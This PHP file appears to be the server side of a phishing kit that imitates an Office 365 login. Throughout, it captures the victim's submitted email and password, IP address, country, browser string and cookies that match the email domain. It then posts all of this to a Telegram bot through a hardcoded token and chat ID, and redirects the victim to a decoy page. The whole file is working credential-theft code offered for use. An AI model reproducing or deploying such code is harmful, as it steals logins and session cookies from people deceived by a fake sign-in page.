<?php
// Telegram Bot API Token
$telegramToken = '7620551383:AAE9qdD3N7cTnJxjYOOqIS1pDaEkkh_SDNM';
$chatId = '6979886709'; // Replace with your Telegram chat ID

// Function to get the country from IP
function getCountryFromIP($ip) {
    $response = file_get_contents("https://ipinfo.io/{$ip}/json");
    $data = json_decode($response, true);
    return isset($data['country']) ? $data['country'] : 'Unknown';
}

// Check if form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $email = $_POST['email']; // Email field
    $password = $_POST['password']; // Password field

    // Get user IP address
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    // Get country from IP
    $country = getCountryFromIP($ipAddress);
    // Get user agent (browser type)
    $browserType = $_SERVER['HTTP_USER_AGENT'];

    // Extract the domain from the email
    $emailDomain = substr(strrchr($email, "@"), 1);

    // Capture relevant cookies based on the email domain
    $selectedCookies = [];
    foreach ($_COOKIE as $key => $value) {
        // Assuming cookie names or values contain the email domain
        if (strpos($key, $emailDomain) !== false || strpos($value, $emailDomain) !== false) {
            $selectedCookies[$key] = $value;
        }
    }
    $cookies = json_encode($selectedCookies); // Encode cookies as JSON for easier reading

    // Create message to send to Telegram
    $message = "New Login Attempt:\n";
    $message .= "Email: " . htmlspecialchars($email) . "\n";
    $message .= "Password: " . htmlspecialchars($password) . "\n";
    $message .= "IP Address: " . htmlspecialchars($ipAddress) . "\n";
    $message .= "Country: " . htmlspecialchars($country) . "\n";
    $message .= "Browser: " . htmlspecialchars($browserType) . "\n";
    $message .= "Cookies: " . htmlspecialchars($cookies) . "\n";

    // URL for Telegram API
    $telegramUrl = "https://api.telegram.org/bot{$telegramToken}/sendMessage";

    // Prepare data to send
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Use cURL to send the message
    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);

    // Optional: Handle response (log it, check for errors, etc.)
    // echo $response; // Uncomment for debugging

    // Redirect to Office 365 login page
    header("Location: ./bill.html");
    exit();
} else {
    echo "Invalid request method.";
}
?>
